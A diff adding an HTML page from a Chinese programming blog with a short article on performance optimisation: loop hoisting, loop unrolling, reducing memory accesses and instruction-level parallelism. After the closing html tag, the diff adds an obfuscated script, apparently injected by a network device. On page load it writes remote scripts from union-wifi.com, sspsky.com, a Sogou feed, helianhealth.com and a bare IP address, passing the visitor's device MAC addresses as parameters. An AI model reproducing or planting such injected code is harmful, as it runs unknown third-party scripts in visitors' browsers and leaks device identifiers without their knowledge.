@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>性能优化</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="http://www.newhuan.info/css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="http://www.newhuan.info/" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">性能优化</h1>
+                <h3 class="date">20170628</h3>
+                <div class="clearfix typo">
+                    <h2>简述几种通用的提升程序性能的代码编写方法</h2>
+
+                    <h3>消除循环的低效率</h3>
+                    <p>每次循环中都要做的相同的事，放到循环外部做，比如计算数组长度这样的操作。</p>
+                    <h3>减少过程调用</h3>
+                    <p>尽量减少循环中的过程调用</p>
+                    <h3>减少不必要的内存调用</h3>
+                    <p>内存读写比寄存器读写要慢很多，所以可以用局部变量作为累积量，最后将局部变量的值赋给外部变量，减少内存读写</p>
+                    <h3>循环展开</h3>
+                    <p>将单步循环拆开，减少循环次数，如：i++ => i += 2</p>
+                    <h3>提高指令并行性</h3>
+                    <p>因为cpu一般包含多个可以使用如加法运算这样的运算单元，而对局部变量（寄存器值）的读写限制了运算单元的并行性，所以可以使用一些方法提升指令的并行性</p>
+                    <p><strong>1.</strong>用多个局部变量累积值的变化</p>
+                    <pre>
+                        <code>
+    a1 += i;
+    a2 += i + 1;
+                        </code>
+                    </pre>
+                    <p><strong>2.</strong>减少对局部变量的改值操作</p>
+                    <pre>
+                        <code>
+    a = (a + i) + j; ==> a = a + (i + j);
+                        </code>
+                    </pre>
+                    <p><strong>注意：</strong>局部变量不要超过可用寄存器的个数，比如x86-64处理器中用于浮点数计算的YMM寄存器共有16个，如果局部变量超过16个就会把值存入运行时栈中，读写速度会大大降低。</p>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.info/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+                <!--<a href="https://github.com/SolidZORO/vodka" target="_blank">vodka</a>-->
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
